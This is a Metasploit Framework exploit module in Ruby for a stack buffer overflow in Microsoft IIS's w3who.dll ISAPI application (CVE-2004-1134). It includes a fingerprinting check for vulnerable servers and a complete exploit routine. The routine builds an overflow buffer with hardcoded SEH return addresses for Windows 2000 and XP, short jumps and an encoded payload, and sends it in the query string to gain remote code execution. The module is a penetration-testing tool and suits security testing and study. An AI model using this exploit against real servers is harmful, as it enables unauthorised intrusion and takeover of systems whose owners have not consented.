##
# $Id: w3who_query.rb 9719 2010-07-07 17:38:59Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	# XXX: Needs custom body check. HttpFingerprint = { :pattern => [ // ] }
	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Microsoft IIS ISAPI w3who.dll Query String Overflow',
			'Description'    => %q{
					This module exploits a stack buffer overflow in the w3who.dll ISAPI
				application. This vulnerability was discovered Nicolas
				Gregoire and this code has been successfully tested against
				Windows 2000 and Windows XP (SP2). When exploiting Windows
				XP, the payload must call RevertToSelf before it will be
				able to spawn a command shell.

			},
			'Author'         => [ 'hdm' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 9719 $',
			'References'     =>
				[
					[ 'CVE', '2004-1134' ],
					[ 'OSVDB', '12258' ],
					[ 'URL', 'http://www.exaprobe.com/labs/advisories/esa-2004-1206.html' ],
					[ 'BID', '11820' ]
				],
			'Privileged'     => false,
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload'        =>
				{
					'Space'    => 632,
					'BadChars' => "\x00\x2b\x26\x3d\x25\x0a\x0d\x20",
					'MinNops'  => 128,
					'StackAdjustment' => -3500,

				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					['Automatic Detection', { }],
					['Windows 2000 RESKIT DLL [Windows 2000]', { 'Rets' => [  48,  0x01169f4a ] }], # pop, pop, ret magic
					['Windows 2000 RESKIT DLL [Windows XP]',   { 'Rets' => [ 748,  0x10019f4a ] }], # pop, pop, ret magic
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Dec 6 2004'))

		register_options(
			[
				OptString.new('URL', [ true,  "The path to w3who.dll", "/scripts/w3who.dll" ]),
			], self.class)
	end

	def auto_target

		res = send_request_raw(
			{
				'uri'   => datastore['URL']
			}, -1)
		http_fingerprint({ :response => res })  # XXX: Needs custom body match

		# Was a vulnerable system detected?
		t = nil
		if (res and res.body =~ /Access Token/)
			case res.headers['Server']
			when /5\.1/
				t = targets[2]
			else
				t = targets[1]
			end
		end
		t
	end

	def check
		if auto_target
			return Exploit::CheckCode::Vulnerable
		end
		Exploit::CheckCode::Safe
	end

	def exploit

		if (target.name =~ /Automatic/)
			mytarget = auto_target
		else
			mytarget = target
		end

		if not mytarget
			raise RuntimeError, "No valid target found"
		end

		buf = rand_text_english(8192, payload_badchars)
		buf[mytarget['Rets'][0] - 4, 4] = make_nops(2) + "\xeb\x04"
		buf[mytarget['Rets'][0] - 0, 4] = [ mytarget['Rets'][1] ].pack('V')
		buf[mytarget['Rets'][0] + 4, 4] = "\xe9" + [-641].pack('V')
		buf[mytarget['Rets'][0] - 4 - payload.encoded.length, payload.encoded.length] = payload.encoded

		print_status("Sending request...")
		r = send_request_raw({
			'uri'   => datastore['URL'],
			'query' => buf
		}, 5)

		handler
	end

end
